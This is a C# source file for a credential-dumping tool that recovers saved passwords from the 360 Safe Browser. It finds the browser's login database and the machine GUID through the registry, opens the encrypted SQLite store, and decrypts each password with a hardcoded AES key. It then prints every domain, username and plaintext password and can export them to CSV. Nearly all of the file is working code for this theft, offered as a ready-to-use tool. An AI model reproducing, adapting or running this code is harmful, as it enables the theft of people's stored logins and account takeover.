using System;
using System.Data;
using System.Text;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using System.Security.Cryptography;

namespace Safe360Browsergetpass
{

    public class Program
    {




        public static void Main(string[] args)
        {
            String Binary = @"
          /$$$$$$  /$$$$$$$                                         
         /$$__  $$| $$__  $$                                        
        |__/  \ $$| $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$$
           /$$$$$/| $$$$$$$  /$$__  $$ |____  $$ /$$_____/ /$$_____/
          |___  $$| $$__  $$| $$  \ $$  /$$$$$$$|  $$$$$$ |  $$$$$$ 
         /$$  \ $$| $$  \ $$| $$  | $$ /$$__  $$ \____  $$ \____  $$
        |  $$$$$$/| $$$$$$$/| $$$$$$$/|  $$$$$$$ /$$$$$$$/ /$$$$$$$/
         \______/ |_______/ | $$____/  \_______/|_______/ |_______/ 
                            | $$                                    
                            | $$                                    
                            |__/   V0.1 by haya & 21reverse



        ";
            Console.WriteLine(Binary);
            var pomocna = new Program();
            ResourceExtractor.ExtractResourceToFile("Safe360Browsergetpass.sqlite3.dll", "sqlite3.dll");
            String dbPath = null;
            String MachineGuid = null;
            bool isCsv = false;
            bool isAuto = false;
            if (args.Length == 0 || args.Length > 4)
            {
                Console.WriteLine("Usage: 360GetBrowserPass.exe <DB path> <MachineGuid> [/csv] [/auto]");
                System.Environment.Exit(0);
            }
            else if (args.Contains("/auto"))
            {
                isAuto = true;
            }
            else
            {
                dbPath = args[0];
                MachineGuid = args[1];
            }
            if (args.Contains("/csv"))
            {
                isCsv = true;
            }
            if (isAuto)
            {
                MachineGuid = pomocna.getKey(@"SOFTWARE\Microsoft\Cryptography", "MachineGuid", 2);
                dbPath = pomocna.getKey(@"360SeSES\DefaultIcon", null, 0).Split(',')[0].Replace(@"360se6\Application\360se.exe", "") + @"360se6\User Data\Default\apps\LoginAssis\assis2.db";
            }
            Console.WriteLine("current DB {0}", dbPath);
            Console.WriteLine("current MachineGuid {0}\n", MachineGuid);

            DataTable bdata = pomocna.GetSqlite3De(dbPath, MachineGuid);

            foreach (DataRow dr in bdata.Rows)
            {
                var _text = dr["password"].ToString().Replace("(4B01F200ED01)", "");
                var passItem = pomocna.DecryptAes(_text);
                StringBuilder _stringb = new StringBuilder();

                if (passItem[0] == '\x02')
                {
                    for (int p = 0; p < passItem.Length; p++)
                    {
                        if (p % 2 == 1)
                        {
                            _stringb.Append(passItem[p]);
                        }
                    }
                    dr["password"] = _stringb;
                }
                else
                {
                    for (int p = 1; p < passItem.Length; p++)
                    {
                        if (p % 2 != 1)
                        {
                            _stringb.Append(passItem[p]);
                        }
                    }
                    dr["password"] = _stringb;
                }
            }
            foreach (DataRow dr in bdata.Rows)
            {

                Console.WriteLine("{0}  {1}  {2}", dr["domain"], dr["username"], dr["password"]);
            }


            if (isCsv)
            {
                string title = "360SafeBrowserPassword_" + DateTime.Now.ToString("yyyyMMddHHmmss") + ".CSV";
                DataTableToCsv obj = new DataTableToCsv();
                StringBuilder data = obj.ConvertDataTableToCsvFile(bdata);
                try
                {
                    obj.SaveData(data, title);
                    Console.WriteLine("passowrd File Save to {0}", title);
                }
                catch
                {
                    Console.WriteLine("Save csv error!");
                }
            }
        }

        public DataTable GetSqlite3De(String dbPath, String MachineGuid)
        {
            //int j = sqlite3_rekey(_db, newpassWord, newLength);

            SQLiteBase db = new SQLiteBase(dbPath, MachineGuid);
            var BrowserTable = db.ExecuteQuery("select * from tb_account");
            //foreach (DataRow dr in BrowserTable.Rows)
            //{
            //    Console.WriteLine("----------------");
            //    Console.WriteLine(dr["domain"]);
            //    Console.WriteLine(dr["username"]);
            //    Console.WriteLine(dr["password"]);
            //}
            return BrowserTable;
        }

        public class DataTableToCsv
        {
            public StringBuilder ConvertDataTableToCsvFile(DataTable dtData)
            {
                StringBuilder data = new StringBuilder();

                //Taking the column names.
                for (int column = 0; column < dtData.Columns.Count; column++)
                {
                    //Making sure that end of the line, shoould not have comma delimiter.
                    if (column == dtData.Columns.Count - 1)
                        data.Append(dtData.Columns[column].ColumnName.ToString().Replace(",", ";"));
                    else
                        data.Append(dtData.Columns[column].ColumnName.ToString().Replace(",", ";") + ',');
                }

                data.Append(Environment.NewLine);//New line after appending columns.

                for (int row = 0; row < dtData.Rows.Count; row++)
                {
                    for (int column = 0; column < dtData.Columns.Count; column++)
                    {
                        ////Making sure that end of the line, shoould not have comma delimiter.
                        if (column == dtData.Columns.Count - 1)
                            data.Append(dtData.Rows[row][column].ToString().Replace(",", ";"));
                        else
                            data.Append(dtData.Rows[row][column].ToString().Replace(",", ";") + ',');
                    }

                    //Making sure that end of the file, should not have a new line.
                    if (row != dtData.Rows.Count - 1)
                        data.Append(Environment.NewLine);
                }
                return data;
            }
            public void SaveData(StringBuilder data, string filePath)
            {
                using (StreamWriter objWriter = new StreamWriter(filePath))
                {
                    objWriter.WriteLine(data);
                }
            }
        }

        public string EncryptAes(string text)
        {

            byte[] src = Encoding.UTF8.GetBytes(text);
            byte[] key = Encoding.ASCII.GetBytes("cf66fb58f5ca3485");
            RijndaelManaged aes = new RijndaelManaged();
            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.PKCS7;
            aes.KeySize = 128;

            using (ICryptoTransform encrypt = aes.CreateEncryptor(key, null))
            {
                byte[] dest = encrypt.TransformFinalBlock(src, 0, src.Length);
                encrypt.Dispose();
                return Convert.ToBase64String(dest);
            }
        }

        public string DecryptAes(string text)
        {

            byte[] src = Convert.FromBase64String(text);
            RijndaelManaged aes = new RijndaelManaged();
            byte[] key = Encoding.ASCII.GetBytes("cf66fb58f5ca3485");
            aes.KeySize = 128;
            //aes.IV = Encoding.UTF8.GetBytes("cf66fb58f5ca3485");//
            //aes.Padding = PaddingMode.Zeros;//
            //aes.BlockSize = 128;//
            aes.Padding = PaddingMode.None;
            aes.Mode = CipherMode.ECB;
            using (ICryptoTransform decrypt = aes.CreateDecryptor(key, null))
            {
                byte[] dest = decrypt.TransformFinalBlock(src, 0, src.Length);
                decrypt.Dispose();
                return Encoding.UTF8.GetString(dest);
            }
        }

        public static readonly RegistryHive[] _hives
  = new[]
        {
              RegistryHive.ClassesRoot,
              RegistryHive.CurrentUser,
              RegistryHive.LocalMachine,
              RegistryHive.Users,
              RegistryHive.PerformanceData,
              RegistryHive.CurrentConfig,
              RegistryHive.DynData
        };
        public string getKey(string regeditPath, string regeditValue, int keyType)
        {
            string x64Result = string.Empty;
            string x86Result = string.Empty;
            string _values = string.Empty;
            try
            {

                RegistryKey keyBaseX64 = RegistryKey.OpenBaseKey(_hives[keyType], RegistryView.Registry64);
                RegistryKey keyBaseX86 = RegistryKey.OpenBaseKey(_hives[keyType], RegistryView.Registry32);
                RegistryKey keyX64 = keyBaseX64.OpenSubKey(regeditPath, RegistryKeyPermissionCheck.ReadSubTree);
                RegistryKey keyX86 = keyBaseX86.OpenSubKey(regeditPath, RegistryKeyPermissionCheck.ReadSubTree);
                object resultObjX64 = keyX64.GetValue(regeditValue, (object)"default");
                object resultObjX86 = keyX86.GetValue(regeditValue, (object)"default");
                keyX64.Close();
                keyX86.Close();
                keyBaseX64.Close();
                keyBaseX86.Close();
                keyX64.Dispose();
                keyX86.Dispose();
                keyBaseX64.Dispose();
                keyBaseX86.Dispose();
                keyX64 = null;
                keyX86 = null;
                keyBaseX64 = null;
                keyBaseX86 = null;
                if (resultObjX64 != null && resultObjX64.ToString() != "default")
                {
                    _values = resultObjX64.ToString();
                    return _values;
                }
                if (resultObjX86 != null && resultObjX86.ToString() != "default")
                {
                    _values = resultObjX86.ToString();
                    return _values;
                }
            }
            catch
            {
                Console.WriteLine("red key error");
            }
            return _values;
        }
    }
}

public static class ResourceExtractor
{
    public static void ExtractResourceToFile(string resourceName, string filename)
    {
        if (!System.IO.File.Exists(filename))
            using (System.IO.Stream s = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            using (System.IO.FileStream fs = new System.IO.FileStream(filename, System.IO.FileMode.Create))
            {
                byte[] b = new byte[s.Length];
                s.Read(b, 0, b.Length);
                fs.Write(b, 0, b.Length);
            }
    }
}